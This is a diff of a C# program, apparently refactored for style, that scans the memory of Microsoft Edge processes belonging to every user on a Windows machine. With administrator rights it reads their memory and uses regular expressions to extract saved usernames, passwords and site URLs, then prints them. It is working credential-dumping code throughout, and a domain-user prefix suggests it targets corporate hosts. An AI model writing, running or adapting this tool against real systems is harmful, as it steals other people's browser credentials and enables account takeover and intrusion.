@@ -1,18 +1,19 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Linq;
 using System.Management;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
 
-class Program
+internal class Program
 {
-    const uint PROCESS_QUERY_INFORMATION = 0x0400;
-    const uint PROCESS_VM_READ = 0x0010;
-    const uint MEM_COMMIT = 0x1000;
-    const uint PAGE_READWRITE = 0x04;
+    private const uint PROCESS_QUERY_INFORMATION = 0x0400;
+    private const uint PROCESS_VM_READ = 0x0010;
+    private const uint MEM_COMMIT = 0x1000;
+    private const uint PAGE_READWRITE = 0x04;
 
     [StructLayout(LayoutKind.Sequential)]
     public struct MEMORY_BASIC_INFORMATION
@@ -27,60 +28,74 @@ class Program
     }
 
     [DllImport("kernel32.dll")]
-    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 
     [DllImport("advapi32.dll", SetLastError = true)]
-    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
 
     [DllImport("kernel32.dll")]
-    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
 
     [DllImport("kernel32.dll")]
-    static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);
+    private static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);
 
     [DllImport("kernel32.dll")]
-    static extern bool CloseHandle(IntPtr hObject);
+    private static extern bool CloseHandle(IntPtr hObject);
 
-    class ProcessInfo
+    private class ProcessInfo
     {
-        public int Id { get; set; }
-        public string Name { get; set; }
-        public string Owner { get; set; }
-        public string CommandLine { get; set; }
+        public int Id
+        {
+            get; set;
+        }
+        public string Name
+        {
+            get; set;
+        }
+        public string Owner
+        {
+            get; set;
+        }
+        public string CommandLine
+        {
+            get; set;
+        }
     }
 
-    static string GetProcessOwnerFromToken(int pid)
+    private static string GetProcessOwnerFromToken(int pid)
     {
-        IntPtr hProcess = OpenProcess(0x1000 /* QUERY_LIMITED_INFORMATION */, false, pid);
+        var hProcess = OpenProcess(0x1000 /* QUERY_LIMITED_INFORMATION */, false, pid);
         if (hProcess == IntPtr.Zero)
+        {
             return "UNKNOWN";
+        }
 
-        IntPtr hToken = IntPtr.Zero;
+        var hToken = IntPtr.Zero;
         if (!OpenProcessToken(hProcess, 8 /* TOKEN_QUERY */, out hToken))
+        {
             return "UNKNOWN";
+        }
 
         try
         {
-            WindowsIdentity wi = new WindowsIdentity(hToken);
+            var wi = new WindowsIdentity(hToken);
             return wi.Name ?? "UNKNOWN";
-        }
-        catch
+        } catch
         {
             return "UNKNOWN";
-        }
-        finally
+        } finally
         {
             CloseHandle(hToken);
             CloseHandle(hProcess);
         }
     }
 
-    static void Main()
+    private static void Main()
     {
         // Check if running elevated (admin)
-        WindowsIdentity identity = WindowsIdentity.GetCurrent();
-        WindowsPrincipal principal = new WindowsPrincipal(identity);
-        bool isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
+        var identity = WindowsIdentity.GetCurrent();
+        var principal = new WindowsPrincipal(identity);
+        var isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
 
         if (!isElevated)
         {
@@ -100,11 +115,8 @@ class Program
         }
 
         Console.Write("Fetching browser processes:");
-        int totalMatches = 0;
-        int shownMatches = 0;
-
-        HashSet<string> seenStrings = new HashSet<string>();
-
+        var totalMatches = 0;
+        var shownMatches = 0;
         var alreadyCheckedUsers = new HashSet<string>();
 
         var searcher = new ManagementObjectSearcher(
@@ -112,12 +124,12 @@ class Program
 
         var processList = new List<ProcessInfo>();
 
-        foreach (ManagementObject mo in searcher.Get())
+        foreach (var mo in searcher.Get().Cast<ManagementObject>())
         {
-            int pid = Convert.ToInt32(mo["ProcessId"]);
-            int parentPid = Convert.ToInt32(mo["ParentProcessId"]);
+            var pid = Convert.ToInt32(mo["ProcessId"]);
+            var parentPid = Convert.ToInt32(mo["ParentProcessId"]);
 
-            bool skip = false;
+            var skip = false;
 
             // Check what process is parent 
             try
@@ -127,14 +139,15 @@ class Program
                 {
                     skip = true;   // Parent is msedge.exe → skip this child process
                 }
-            }
-            catch
+            } catch
             {
                 // Parent may have exited → treat as root process
             }
 
             if (skip)
+            {
                 continue;
+            }
 
             // The credentials are only stored at root/parent msedge.exe processes
             processList.Add(new ProcessInfo
@@ -147,82 +160,86 @@ class Program
 
         Console.WriteLine(" Done.\n");
 
+
+        var seenStrings = new HashSet<string>();
         foreach (var proc in processList)
         {
             if (alreadyCheckedUsers.Contains($"{proc.Owner} {proc.Name}"))
             {
                 // Console.WriteLine($"SKIPPING process PID: {proc.Id} - Already checked.");
+                continue;
             }
-            else
-            {
-                string owner = proc.Owner.Replace("NSC\\t1_","");
-                Console.WriteLine($"Scanning process PID: {proc.Id}\tName: {proc.Name}\tOwner: {owner}");
 
-                IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, proc.Id);
-                if (processHandle == IntPtr.Zero)
+            var owner = proc.Owner.Replace("NSC\\t1_", "");
+            Console.WriteLine($"Scanning process PID: {proc.Id}\tName: {proc.Name}\tOwner: {owner}");
+
+            var processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, proc.Id);
+            if (processHandle == IntPtr.Zero)
+            {
+                Console.WriteLine($"Failed to open process: {proc.Id} {proc.Name} {proc.Owner}");
+                continue;
+            }
+
+            var address = IntPtr.Zero;
+            MEMORY_BASIC_INFORMATION memInfo;
+
+            while (VirtualQueryEx(processHandle, address, out memInfo, (uint)Marshal.SizeOf<MEMORY_BASIC_INFORMATION>()) != 0)
+            {
+                address = new IntPtr(memInfo.BaseAddress.ToInt64() + (long)memInfo.RegionSize);
+                var readable = memInfo.State == MEM_COMMIT && memInfo.Protect == PAGE_READWRITE;
+                if (!readable)
                 {
-                    Console.WriteLine($"Failed to open process: {proc.Id} {proc.Name} {proc.Owner}");
+                    continue;
+                }
+                var buffer = new byte[(int)memInfo.RegionSize];
+                IntPtr bytesRead;
+
+                if (!ReadProcessMemory(processHandle, memInfo.BaseAddress, buffer, buffer.Length, out bytesRead))
+                {
                     continue;
                 }
 
-                IntPtr address = IntPtr.Zero;
-                MEMORY_BASIC_INFORMATION memInfo;
 
-                while (VirtualQueryEx(processHandle, address, out memInfo, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
+                var utf8 = Encoding.UTF8.GetString(buffer);
+                var lines = Regex.Split(utf8, @"\r\n|\r|\n");
+
+                foreach (var line in lines)
                 {
-                    bool readable = memInfo.State == MEM_COMMIT && memInfo.Protect == PAGE_READWRITE; 
+                    // Pattern for saved passwords - Notice \x20 og \x00 - this is the pattern to look for in memory
+                    var pattern = @"[a-zA-Z]https?\x20([a-zA-ZæøåÆØÅ0-9\\-_\.@\?]{1,20})\x20([a-zA-ZæøåÆØÅ0-9#!@#\$%\^&\*\(\)_\-\+=\{\}\[\]:;<>\?/~\s]{1,40})\x20\x00";
 
-                    if (readable)
+                    var matches = Regex.Matches(line, pattern);
+
+                    foreach (Match match in matches)
                     {
-                        byte[] buffer = new byte[(int)memInfo.RegionSize];
-                        IntPtr bytesRead;
+                        var username = match.Groups[1].Value;
+                        var password = match.Groups[2].Value;
+                        var potentialPattern = $"{username} : {password}";
+                        var beforeUrlPatternCheck = shownMatches;
 
-                        if (ReadProcessMemory(processHandle, memInfo.BaseAddress, buffer, buffer.Length, out bytesRead))
+                        var urlPattern = $@"\x00\x00\x00([A-Za-z0-9\-._~:/?#\[\]@!$&'()*+,;=%]+)(https?)\x20{Regex.Escape(username)} {Regex.Escape(password)}";
+
+                        // Find all URLs for this line
+                        foreach (Match urlMatch in Regex.Matches(line, urlPattern)) // This could be done in the for loop above, but I had some issues 
                         {
-                            string utf8 = Encoding.UTF8.GetString(buffer);
-                            string[] lines = Regex.Split(utf8, @"\r\n|\r|\n");
-
-                            foreach (var line in lines)
+                            var value = urlMatch.Groups[1].Value;
+                            var combined = $"{potentialPattern} @{value}";
+                            if (seenStrings.Contains(combined))
                             {
-                                // Pattern for saved passwords - Notice \x20 og \x00 - this is the pattern to look for in memory
-                                string pattern = @"[a-zA-Z]https?\x20([a-zA-ZæøåÆØÅ0-9\\-_\.@\?]{1,20})\x20([a-zA-ZæøåÆØÅ0-9#!@#\$%\^&\*\(\)_\-\+=\{\}\[\]:;<>\?/~\s]{1,40})\x20\x00"; 
-
-                                MatchCollection matches = Regex.Matches(line, pattern);
-
-                                foreach (Match match in matches) 
-                                {
-                                    string username = match.Groups[1].Value;
-                                    string password = match.Groups[2].Value;
-                                    string potentialPattern = $"{username} : {password}";
-                                    int beforeUrlPatternCheck = shownMatches;
-
-                                    string urlPattern = $@"\x00\x00\x00([A-Za-z0-9\-._~:/?#\[\]@!$&'()*+,;=%]+)(https?)\x20{Regex.Escape(username)} {Regex.Escape(password)}";
-
-                                    // Find all URLs for this line
-                                    foreach (Match urlMatch in Regex.Matches(line, urlPattern)) // This could be done in the for loop above, but I had some issues 
-                                    {
-                                        string value = urlMatch.Groups[1].Value;
-                                        string combined = $"{potentialPattern} @{value}";
-                                        if (!seenStrings.Contains(combined))
-                                        {
-                                            Console.WriteLine(combined);
-                                            seenStrings.Add(combined);
-
-                                            shownMatches++;
-                                            totalMatches++;
-                                        }
-                                    }
-                                    alreadyCheckedUsers.Add($"{proc.Owner} {proc.Name}");
-                                }
+                                continue;
                             }
-                        }
-                    }
-                    address = new IntPtr(memInfo.BaseAddress.ToInt64() + (long)memInfo.RegionSize);
-                }
+                            Console.WriteLine(combined);
+                            seenStrings.Add(combined);
 
-                CloseHandle(processHandle);
+                            shownMatches++;
+                            totalMatches++;
+                        }
+                        alreadyCheckedUsers.Add($"{proc.Owner} {proc.Name}");
+                    }
+                }
             }
-        } 
+            CloseHandle(processHandle);
+        }
         seenStrings.Clear(); // Removes all items
         seenStrings = null;  // Removes reference, eligible for GC
 
